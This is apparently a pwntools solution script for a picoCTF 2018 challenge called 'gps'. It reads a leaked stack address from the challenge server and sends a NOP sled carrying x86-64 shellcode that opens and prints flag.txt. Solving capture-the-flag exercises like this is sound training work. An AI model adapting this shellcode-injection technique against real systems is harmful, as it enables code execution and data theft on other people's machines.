from pwn import *

p = remote('2018shell2.picoctf.com', 29035)
# p = process('./gps')

p.recvuntil('Current position: ')
currentPosition = p.recvuntil('\n', drop=True)

currentPosition = hex(int(currentPosition, 16) + 0x400)

p.recvuntil('> ')

shellcode = \
'\x6a\x01\xfe\x0c\x24\x48\xb8\x66\
\x6c\x61\x67\x2e\x74\x78\x74\x50\
\x6a\x02\x58\x48\x89\xe7\x31\xf6\
\x99\x0f\x05\x41\xba\xff\xff\xff\
\x7f\x48\x89\xc6\x6a\x28\x58\x6a\
\x01\x5f\x99\x0f\x05'
payload = '\x90' * (0x999 - len(shellcode))
payload += shellcode

p.sendline(payload)
# pause()
p.sendlineafter('> ', currentPosition)

print p.recvline()

p.close()